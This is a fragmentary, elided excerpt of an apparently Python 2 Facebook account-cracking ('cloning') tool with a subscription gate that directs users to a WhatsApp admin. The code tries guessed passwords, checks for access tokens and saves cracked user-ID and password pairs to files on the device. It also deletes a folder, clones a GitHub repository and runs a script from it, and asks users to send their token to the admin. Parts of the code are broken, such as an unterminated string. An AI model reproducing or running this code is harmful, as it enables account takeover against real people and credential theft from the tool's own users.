...
def lasm():
    ...
    try:
        ...
        if dec in r:
            ...
            print ' Admin WhatsApp : 03480204796'
            print 47 * '-'
            print ''
            print '\x1b[1;97m'
            print ''
...
def lo():
    ...
    try:
        ...
        if dec in r:
            ...
            print ''
            print 47 * '-'
            print '\x1b[1;91m       You dont Have jeevat Subscription\x1b[1;97m'
            print 47 * '-'
            print '\x1b[1;97m'
            print ''
            print ' \x1b[1;93mPLEASE COPY YOUR TOKEN AN SEND TO ADMIN\x1b[1;97m'
            ...
            print ''
            raw_input('Press Enter To Chek Subscription')
            os.system('xdg-open https://wa.me/+0013480204796')
            i()
    except IOError:
        o()
    except requests.exceptions.ConnectionError:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;32m[Jeevat-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/jeevat-CLONING/jeevat-OK.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            ...
                            if 'www.facebook.com' in q['error_msg']:
                                ...
                                cp = open('/sdcard/jeevat-CLONING/RSA-CP.txt', 'a')
                                cp.write(uid + '|' + pass4 + '\n')
                                cp.close()
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;37m[jeevat-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    cp = open('/sdcard/RSA-CLONING/RSA-CP.txt', 'a')
                                    cp.write(uid + '|' + pass5 + '\n')
                                    cp.close()
...
def tt():
    ...
    if a == '1':
        ...
        print ''
        os.system('rm -rf rsa')
        os.system('git clone https://github.com/Jeevatrajgamer/JK)
        os.system('cd jeevat && python2 jeevraj.py')
    elif a == '0':
        print 'Good Byee'
    else:
